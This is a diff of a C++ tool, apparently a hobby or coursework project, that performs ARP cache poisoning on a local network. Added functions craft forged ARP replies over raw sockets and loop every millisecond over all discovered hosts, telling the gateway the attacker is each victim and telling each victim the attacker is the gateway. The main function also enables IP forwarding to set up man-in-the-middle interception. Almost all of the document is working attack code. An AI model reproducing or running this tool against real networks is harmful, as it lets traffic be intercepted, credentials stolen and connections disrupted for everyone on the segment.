@@ -51,6 +51,7 @@ string gateway_ip;
 string source_ip;
 string interface;
 string source_mac;
+int ifindex;
 
 struct ether_arp *fill_arp_packet(const unsigned char *src_mac_addr, const char *src_ip, const char *dst_ip)
 {
@@ -76,8 +77,7 @@ struct ether_arp *fill_arp_packet(const unsigned char *src_mac_addr, const char 
     return arp_packet;
 }
 
-string exec(const char *cmd)
-{
+string exec(const char *cmd){
     array<char, 128> buffer;
     string result;
     unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
@@ -152,6 +152,7 @@ void arp_request(const char *if_name, const char *base_ip)
         cerr << "Error getting index." << endl;
     }
     saddr_ll.sll_ifindex = ifr.ifr_ifindex;
+    ifindex = ifr.ifr_ifindex;
     saddr_ll.sll_family = PF_PACKET;
     // cout << "Interface index: " << ifr.ifr_ifindex << endl;
     // local ip
@@ -228,8 +229,78 @@ void list_devices()
         cout << it->first << "\t" << it->second << endl;
     }
 }
+void arp_reply(const char *if_name, const unsigned char *src_mac_addr, const char *src_ip, const char *dst_ip, const unsigned char *dst_mac_addr, const char *target_ip)
+{
+    struct sockaddr_ll saddr_ll;
+    struct ether_header *eth_header;
+    struct ether_arp *arp_packet;
+    struct ifreq ifr;
+    char buf[ETHER_ARP_PACKET_LEN];
+    int sock_raw_fd, ret_len;
 
-atomic<bool> stop_spoofing(false);
+    if ((sock_raw_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1)
+    {
+        cerr << "Error creating socket." << endl;
+    }
+    // cout << "Socket created: " << sock_raw_fd << endl;
+    bzero(&saddr_ll, sizeof(struct sockaddr_ll));
+    bzero(&ifr, sizeof(struct ifreq));
+    memcpy(ifr.ifr_name, if_name, strlen(if_name));
+    // cout << "Interface name: " << if_name << endl;
+    // ifindex
+    if (ioctl(sock_raw_fd, SIOCGIFINDEX, &ifr) < 0)
+    {
+        cerr << "Error getting index." << endl;
+    }
+    saddr_ll.sll_ifindex = ifr.ifr_ifindex;
+    saddr_ll.sll_family = PF_PACKET;
+    // cout << "Interface index: " << ifr.ifr_ifindex << endl;
+
+    bzero(buf, ETHER_ARP_PACKET_LEN);
+    // ethheader
+    eth_header = (struct ether_header *)buf;
+    memcpy(eth_header->ether_shost, src_mac_addr, ETH_ALEN);
+    memcpy(eth_header->ether_dhost, dst_mac_addr, ETH_ALEN);
+    eth_header->ether_type = htons(ETHERTYPE_ARP);
+    // arp packet
+    arp_packet = fill_arp_packet(src_mac_addr, src_ip, dst_ip);
+    memcpy(buf + ETHER_HEADER_LEN, arp_packet, ETHER_ARP_LEN);
+
+    // sendto
+    ret_len = sendto(sock_raw_fd, buf, ETHER_ARP_PACKET_LEN, 0, (struct sockaddr *)&saddr_ll, sizeof(struct sockaddr_ll));
+    if (ret_len < 0)
+    {
+        cerr << "Error sending packet." << endl;
+    }
+
+    close(sock_raw_fd);
+}
+
+void keep_sending_arp_reply( unsigned char *source_mac_char, unsigned char *gateway_mac_char)
+{
+    while(true){
+        // iterate all devices
+        for(auto it = devices.begin(); it != devices.end(); ++it){
+            // if the device is not the gateway and the source
+            if(it->first != gateway_ip && it->first != source_ip){
+                // change string of mac to unsigned char[6]
+                unsigned char target_mac_char[6];
+                sscanf(it->second.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+                    &target_mac_char[0], &target_mac_char[1], &target_mac_char[2],
+                    &target_mac_char[3], &target_mac_char[4], &target_mac_char[5]);
+                // send ARP reply to gateway 
+                // trick the gateway we are the victim
+                arp_reply(interface.c_str(), source_mac_char, source_ip.c_str(), gateway_ip.c_str(), target_mac_char, it->first.c_str());                
+                // send ARP reply to victim
+                // trick the victim we are the gateway
+                arp_reply(interface.c_str(), gateway_mac_char, gateway_ip.c_str(), it->first.c_str(), target_mac_char, source_ip.c_str());  
+            }
+        }
+        this_thread::sleep_for(chrono::microseconds(1000)); 
+    }
+
+
+}
 void arp_spoofing()
 {
     string gateway_mac = devices[gateway_ip];
@@ -248,60 +319,14 @@ void arp_spoofing()
            &source_mac_char[0], &source_mac_char[1], &source_mac_char[2],
            &source_mac_char[3], &source_mac_char[4], &source_mac_char[5]);
 
-    // AI   ///////  ARP Spoofing  ///////
-    while(!stop_spoofing){
-        // send ARP reply to gateway
-        struct ether_arp *arp_packet = fill_arp_packet(source_mac_char, source_ip.c_str(), gateway_ip.c_str());
-        struct ether_header eth_header;
-        memcpy(eth_header.ether_shost, source_mac_char, ETH_ALEN);
-        memcpy(eth_header.ether_dhost, gateway_mac_char, ETH_ALEN);
-        eth_header.ether_type = htons(ETHERTYPE_ARP);
-        int sock_raw_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
-        struct sockaddr_ll saddr_ll;
-        struct ifreq ifr;
-        bzero(&saddr_ll, sizeof(struct sockaddr_ll));
-        bzero(&ifr, sizeof(struct ifreq));
-        memcpy(ifr.ifr_name, interface.c_str(), strlen(interface.c_str()));
-        if (ioctl(sock_raw_fd, SIOCGIFINDEX, &ifr) < 0)
-        {
-            cerr << "Error getting index." << endl;
-        }
-        saddr_ll.sll_ifindex = ifr.ifr_ifindex;
-        saddr_ll.sll_family = PF_PACKET;
-        sendto(sock_raw_fd, &eth_header, ETHER_HEADER_LEN, 0, (struct sockaddr *)&saddr_ll, sizeof(struct sockaddr_ll));
-        sendto(sock_raw_fd, arp_packet, ETHER_ARP_LEN, 0, (struct sockaddr *)&saddr_ll, sizeof(struct sockaddr_ll));
-        close(sock_raw_fd);
-        // send ARP reply to all other devices
-        for (auto it = devices.begin(); it != devices.end(); ++it)
-        {
-            if (it->first == gateway_ip || it->first == source_ip)
-                continue;
-            unsigned char target_mac_char[6];
-            sscanf(it->second.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-                &target_mac_char[0], &target_mac_char[1], &target_mac_char[2],
-                &target_mac_char[3], &target_mac_char[4], &target_mac_char[5]);
-            struct ether_arp *arp_packet = fill_arp_packet(source_mac_char, source_ip.c_str(), it->first.c_str());
-            struct ether_header eth_header;
-            memcpy(eth_header.ether_shost, source_mac_char, ETH_ALEN);
-            memcpy(eth_header.ether_dhost, target_mac_char, ETH_ALEN);
-            eth_header.ether_type = htons(ETHERTYPE_ARP);
-            int sock_raw_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
-            struct sockaddr_ll saddr_ll;
-            struct ifreq ifr;
-            bzero(&saddr_ll, sizeof(struct sockaddr_ll));
-            bzero(&ifr, sizeof(struct ifreq));
-            memcpy(ifr.ifr_name, interface.c_str(), strlen(interface.c_str()));
-            if (ioctl(sock_raw_fd, SIOCGIFINDEX, &ifr) < 0)
-            {
-                cerr << "Error getting index." << endl;
-            }
-            saddr_ll.sll_ifindex = ifr.ifr_ifindex;
-            saddr_ll.sll_family = PF_PACKET;
-            sendto(sock_raw_fd, &eth_header, ETHER_HEADER_LEN, 0, (struct sockaddr *)&saddr_ll, sizeof(struct sockaddr_ll));
-            sendto(sock_raw_fd, arp_packet, ETHER_ARP_LEN, 0, (struct sockaddr *)&saddr_ll, sizeof(struct sockaddr_ll));
-            close(sock_raw_fd);
-        }
-    }
+    // thread to send ARP reply to gateway and victim
+    thread arp_reply_thread(keep_sending_arp_reply, source_mac_char, gateway_mac_char);
+
+
+
+    
+
+    arp_reply_thread.join();
 }
 
 int main()
@@ -314,8 +339,9 @@ int main()
     Sending spoofed ARP packets to all neighbors (possible victims)
     to trick AP we are the victim and trick the victim we are AP
     */
-    thread spoofing_thread(arp_spoofing);
-    spoofing_thread.join();
+    if(system("sysctl -w net.ipv4.ip_forward=1"))
+        cerr << "Error enabling IP forwarding." << endl;
+    arp_spoofing();
 
     return 0;
 }
